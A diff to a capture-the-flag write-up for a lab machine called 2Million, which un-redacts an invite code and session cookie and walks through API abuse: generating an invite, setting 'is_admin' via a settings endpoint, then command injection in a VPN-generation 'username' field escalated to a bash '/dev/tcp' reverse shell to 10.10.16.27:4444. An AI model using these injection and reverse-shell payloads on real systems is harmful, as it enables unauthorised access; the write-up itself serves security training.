@@ -137,19 +137,19 @@ curl -X POST http://2million.htb/api/v1/invite/generate | jq .
   "0": 200,
   "success": 1,
   "data": {
-    "code": "<BASE64 REDACTED>",
+    "code": "WlcyVFMtVFBaMEgtOTBCVUEtNVlLUEc=",
     "format": "encoded"
   }
 }
 ```
 
 ```bash
-echo '<BASE64 REDACTED>' | base64 -d
+echo 'WlcyVFMtVFBaMEgtOTBCVUEtNVlLUEc=' | base64 -d
 ```
 
 ```
 # Console Output
-<INVITE CODE REDACTED>
+ZW2TS-TPZ0H-90BUA-5YKPG
 ```
 
 > **Note:** The invite code is session-specific and rotates on box reset.
@@ -165,7 +165,7 @@ After registering and authenticating we land on the HTB v1 dashboard:
 Intercepting the "Connection Pack" download from `/home/access` in Burp reveals a request to `/api/v1/user/vpn/generate`. Trimming the path to `/api/v1` with our session cookie returns the full route map:
 
 ```bash
-curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=<REDACTED>' | jq .
+curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i493v' | jq .
 ```
 
 ```json
@@ -220,7 +220,7 @@ Submitting all three parameters:
 
 ```bash
 curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
-  -H 'Cookie: PHPSESSID=<REDACTED>' \
+  -H 'Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i493v' \
   -H 'Content-Type: application/json' \
   -d '{"email": "jhaxx@2million.htb", "is_admin": 1}' | jq .
 ```
@@ -241,7 +241,7 @@ The `POST /api/v1/admin/vpn/generate` endpoint accepts a `username` field and ge
 ```
 POST /api/v1/admin/vpn/generate HTTP/1.1
 Host: 2million.htb
-Cookie: PHPSESSID=<REDACTED>
+Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i493v
 Content-Type: application/json
 
 {"username":"test$(whoami)"}
@@ -255,6 +255,11 @@ Subject: C=GB, ST=London, L=London, O=testwww-data, CN=testwww-data
 `www-data` is embedded in the certificate Subject — the `username` value is passed unsanitized to a shell command. We escalate to a reverse shell:
 
 ```
+POST /api/v1/admin/vpn/generate HTTP/1.1
+Host: 2million.htb
+Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i493v
+Content-Type: application/json
+
 {"username":"test$(bash -c 'exec bash -i &>/dev/tcp/10.10.16.27/4444 <&1')"}
 ```
 
